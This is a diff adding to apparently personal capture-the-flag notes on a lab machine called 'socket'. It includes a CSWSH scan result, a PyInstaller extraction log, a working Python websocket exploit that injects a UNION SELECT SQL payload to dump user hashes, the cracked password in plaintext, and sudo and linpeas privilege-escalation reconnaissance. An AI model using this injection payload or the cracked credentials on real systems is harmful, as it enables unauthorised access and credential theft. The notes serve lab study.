@@ -35,3 +35,77 @@ so  5789 oirt us also open
 ====Full list of vulnerable URLs===
 ['ws://10.10.11.206:5789']
 ['>>>VANILLA CSWSH DETECTED: ws://10.10.11.206:5789 likely vulnerable to vanilla CSWSH (any origin)']
+
+```
+
+[+] Processing qreader
+[+] Pyinstaller version: 2.1+
+[+] Python version: 3.10
+[+] Length of package: 108535118 bytes
+[+] Found 305 files in CArchive
+[+] Beginning extraction...please standby
+[+] Possible entry point: pyiboot01_bootstrap.pyc
+[+] Possible entry point: pyi_rth_subprocess.pyc
+[+] Possible entry point: pyi_rth_inspect.pyc
+[+] Possible entry point: pyi_rth_pkgutil.pyc
+[+] Possible entry point: pyi_rth_multiprocessing.pyc
+[+] Possible entry point: pyi_rth_pyqt5.pyc
+[+] Possible entry point: pyi_rth_setuptools.pyc
+[+] Possible entry point: pyi_rth_pkgres.pyc
+[+] Possible entry point: qreader.pyc
+[!] Warning: This script is running in a different Python version than the one used to build the executable.
+[!] Please run this script in Python 3.10 to prevent extraction errors during unmarshalling
+[!] Skipping pyz extraction
+[+] Successfully extracted pyinstaller archive: qreader
+
+You can now use a python decompiler on the pyc files within the extracted directory
+
+```
+after looking into the source code we can find the exploit
+
+```
+from websocket import create_connection
+import json
+ws_host = 'ws://qreader.htb:5789'
+VERSION = '0.0.3" UNION SELECT username,password,"3","4" from users;-- -'
+ws = create_connection(ws_host + '/version')
+ws.send(json.dumps({'version': VERSION}))
+result = ws.recv()
+print(result)
+ws.close()
+```
+
+python3 exploit_socket.py
+{"message": {"id": "admin", "version": "0c090c365fa0559b151a43e0fea39710", "released_date": "3", "downloads": "4"}}
+
+cracking it in crackstation
+	denjanjade122566
+                     
+the admin is somehow tkeller
+
+
+tkeller@socket:~$ sudo -l
+Matching Defaults entries for tkeller on socket:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User tkeller may run the following commands on socket:
+    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh
+
+
+running linpeas.sh
+
+Proc 1305 with ppid 1263 is run by user svc but the ppid user is root
+Proc 1306 with ppid 1263 is run by user svc but the ppid user is root
+Proc 1959 with ppid 1 is run by user tkeller but the ppid user is root
+Proc 2066 with ppid 1956 is run by user tkeller but the ppid user is root
+
+tkeller@socket:~$ ps -aux | grep 1305
+svc         1305  0.0  1.7 385300 70292 ?        Ssl  05:42   0:02 python3 /var/www/main/main.py
+tkeller    22305  0.0  0.0   6476  2436 pts/0    S+   07:31   0:00 grep --color=auto 1305
+tkeller@socket:~$ ps -aux | grep 1306
+_laurel      776  0.0  0.2  13064  8948 ?        S<   05:42   0:04 /usr/local/sbin/laurel --config /etc/laurel/config.toml
+svc         1306  0.0  0.5  32540 23348 ?        Ss   05:42   0:00 python3 /var/www/ws_server/server.py
+tkeller    22307  0.0  0.0   6608  2476 pts/0    S+   07:31   0:00 grep --color=auto 1306
+
